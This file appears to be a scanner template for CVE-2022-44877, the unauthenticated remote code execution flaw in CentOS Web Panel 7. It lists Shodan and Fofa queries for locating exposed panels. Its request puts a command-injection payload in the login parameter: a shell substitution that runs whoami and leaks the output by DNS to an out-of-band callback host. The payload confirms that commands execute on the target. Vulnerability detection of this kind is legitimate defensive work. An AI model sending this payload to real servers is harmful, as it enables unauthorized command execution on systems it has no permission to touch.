id: CVE-2022-44877

info:
  name: Centos Web Panel 7 Unauthenticated Remote Code
  author: xpoc
  severity: critical
  verified: false
  description: |
    Shodan: http.title:"Login | Control WebPanel"
    Fofa: app="CWP-虚拟主机控制面板"
  reference:
    - https://github.com/numanturle/CVE-2022-44877
    - https://twitter.com/_0xf4n9x_/status/1612068225046675457
    - https://github.com/numanturle/CVE-2022-44877
    - https://gist.github.com/numanturle/c1e82c47f4cba24cff214e904c227386
    - https://nvd.nist.gov/vuln/detail/CVE-2022-44877
    - http://packetstormsecurity.com/files/171725/Control-Web-Panel-7-CWP7-0.9.8.1147-Remote-Code-Execution.html
  tags: cwp7,cve,cve2022,webpanel,centos,rce
  created: 2023/06/22

set:
  oob: oob()
  oobDNS: oob.DNS
rules:
  r0:
    request:
      method: POST
      path: /login/index.php?login=$(ping${IFS}-nc${IFS}2${IFS}`whoami`.{{oobDNS}})
      body: username=root&password=toor&commit=Login
    expression: response.status == 302 && oobCheck(oob, oob.ProtocolDNS, 3)
expression: r0()
